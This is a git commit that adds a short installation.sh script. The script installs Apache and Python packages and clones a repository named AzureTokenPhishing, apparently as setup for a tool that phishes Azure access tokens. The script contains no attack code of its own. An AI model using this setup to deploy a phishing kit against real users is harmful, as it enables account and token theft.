dfb66ef6b686abd8ac721e29699e8bc98ca57505
Rafay Ahmed <ahmedrafay888@gmail.com>
2024-01-19 16:46:42 +0300

    Added Vhosts configurations and installation.sh

---
+++ installation.sh
@@ -0,0 +1,5 @@
+sudo apt update && sudo apt-get install apache2 python3-pip
+pip3 install requests watchdog
+git clone https://github.com/rafayahmed317/AzureTokenPhishing.git
+cd AzureTokenPhishing
+
